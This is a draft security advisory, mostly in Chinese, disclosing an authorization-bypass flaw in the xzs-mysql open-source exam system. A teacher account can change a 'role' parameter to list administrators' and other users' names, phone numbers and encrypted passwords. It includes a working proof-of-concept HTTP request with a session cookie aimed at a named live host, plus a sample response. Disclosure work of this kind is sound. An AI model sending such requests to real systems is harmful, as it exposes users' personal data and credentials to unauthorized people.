# GitHub Security Advisory

---

| 字段            | 内容                                                       |
| --------------- | ---------------------------------------------------------- |
| **Advisory ID** | `GHSA-xzs-idor-role-param`                                 |
| **CVE ID**      | (待分配)                                                   |
| **CWE ID**      | CWE-639 — Authorization Bypass Through User-Controlled Key |
| **Severity**    | **Medium** (CVSS 6.5)                                      |
| **Status**      | Draft                                                      |
| **Published**   | (待发布)                                                   |

---

## Package Information

| 字段                  | 内容                                  |
| --------------------- | ------------------------------------- |
| **Ecosystem**         | Other（学之思开源考试系统 xzs-mysql） |
| **Package Name**      | `com.mindskip:xzs`                    |
| **Affected Versions** | `<= 3.9.0`                            |
| **Patched Version**   | 暂无（待修复）                        |

---

## CVSS Score

| 字段              | 值                                             |
| ----------------- | ---------------------------------------------- |
| **CVSS Version**  | 3.1                                            |
| **Vector String** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Score**         | **6.5 (Medium)**                               |

### CVSS 指标详解

| 指标 | 值        | 理由                                         |
| ---- | --------- | -------------------------------------------- |
| AV:N | Network   | 通过网络即可利用                             |
| AC:L | Low       | 仅需修改 JSON 请求体中的 `role` 参数         |
| PR:L | Low       | 需要教师级别 (role=2) 的认证账号             |
| UI:N | None      | 无需用户交互                                 |
| S:U  | Unchanged | 影响范围不超出当前应用                       |
| C:H  | High      | 泄露管理员用户名、手机号、加密密码等敏感信息 |
| I:N  | None      | 仅查询操作，不修改数据                       |
| A:N  | None      | 不影响系统可用性                             |

---

## Summary

学之思开源考试系统（xzs-mysql）教师端 `POST /api/teacher/user/page/list` 接口存在越权查询漏洞。`UserPageRequestVM` 中的 `role` 参数完全由请求方控制，在 ViewModel → Controller → Service → DAO 四层中逐层透传，未校验"当前用户是否有权查询目标角色"。已认证的教师用户 (role=2) 可通过修改 `role=3` 枚举并获取所有管理员账号列表及其敏感信息。

---

## Description

### 漏洞位置

- **端点**: `POST /api/teacher/user/page/list`
- **参数**: `UserPageRequestVM.role`（请求体 JSON 中的 Integer 字段）
- **涉及模块**: ViewModel → Controller → Service → DAO（四层透传无校验）

### 根因分析

`UserPageRequestVM` 类中 `role` 字段定义为：

```java
public class UserPageRequestVM extends BasePage {
    private String userName;
    private Integer role;       // 接受任意 Integer: 1=学生, 2=教师, 3=管理员
}
```

该字段**无任何校验注解**（无 `@NotNull`、`@Min`、`@Max`、自定义 Validator），也未在 Controller/Service 层与当前登录用户的角色进行比对。

Controller 层代码：

```java
// com.mindskip.xzs.controller.admin.UserController (复用为 TeacherUserController)
@RequestMapping(value = "/page/list", method = RequestMethod.POST)
public RestResponse<PageInfo<UserResponseVM>> pageList(
        @RequestBody UserPageRequestVM model) {
    
    // ❌ 缺失: getCurrentUser().getRole() 与 model.getRole() 的比对
    PageInfo<User> pageInfo = userService.userPage(model);
    return RestResponse.ok(page);
}
```

### 数据流

```
攻击者 POST → TeacherUserController.pageList(model.role=3)
  → UserServiceImpl.userPage(requestVM)              // 透传
    → UserMapper.userPage → SQL: WHERE role=3          // 查询所有管理员
      → 返回管理员列表（含 userName、realName、phone、password密文）
```

### 利用条件

教师端部署（Port 7002）中，Teacher 用户 (role=2) 可发起攻击，需持有有效的教师 Session/Cookie。

---

## Impact

1. **信息泄露**: 教师可获取管理员账号列表，包括：
   - `userName` — 管理员登录名
   - `realName` — 管理员真实姓名
   - `phone` — 管理员手机号（PII）
   - `password` — 管理员密码的 RSA 加密密文（可离线破解）
   - `status` — 账号启用状态
   - `role` — 角色确认

2. **攻击链升级**: 获取管理员用户名后，攻击者可以：
   - 针对管理员账号进行暴力破解
   - 配合其他漏洞（如未授权文件上传）扩大攻击面
   - 利用手机号进行社会工程攻击

3. **多角色枚举**: 修改 `role` 参数可遍历所有角色用户：
   - `role=3` → 管理员列表
   - `role=2` → 教师列表
   - `role=1` → 学生列表

---

## Proof of Concept

### 请求

```http
POST /api/teacher/user/page/list HTTP/1.0
Host: www.mindskip.net:7002
Cookie: Hm_lvt_c7122418f8b68956b5e4fcbc714d1bd6=1782193317; HMACCOUNT=D6DA7C99C6233FBE; SESSION=ZDU1ZjdhMzgtNTM4Yy00MGUyLWJlYWItNGY5N2NmZDBkOTBm; XzsTeacherUserName=teacher; Hm_lpvt_c7122418f8b68956b5e4fcbc714d1bd6=1782193388; XzsAdminUserName=admin
Content-Length: 40
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Content-Type: application/json
Request-Ajax: true
Sec-Ch-Ua-Mobile: ?0
Origin: https://www.mindskip.net:7002
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.mindskip.net:7002/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i
Connection: keep-alive

{"pageIndex":1,"pageSize":9999,"role":2}
```
Role=1时查询学生信息，role=2时越权查询教师信息，role=3时查询管理员信息  这些功能都是管理端才拥有的功能
<img width="1268" height="537" alt="图片1" src="https://github.com/user-attachments/assets/1d1216ec-09ce-4d68-b434-3c5a0a954eb9" />

### 预期正常行为

教师 (role=2) 调用此接口时应当：

- 仅返回 `role < 2` 的用户（即学生列表）
- 请求 `role=3` 时返回 `403 Forbidden`

### 实际异常行为

返回管理员列表：

```json
{
  "code": 1,
  "message": "成功",
  "response": {
    "total": 1,
    "list": [
      {
        "id": 1,
        "userName": "admin",
        "realName": "系统管理员",
        "role": 3,
        "status": 1,
        "phone": "13800138000",
        "createTime": "2020-01-01 00:00:00"
      }
    ]
  }
}
```

---
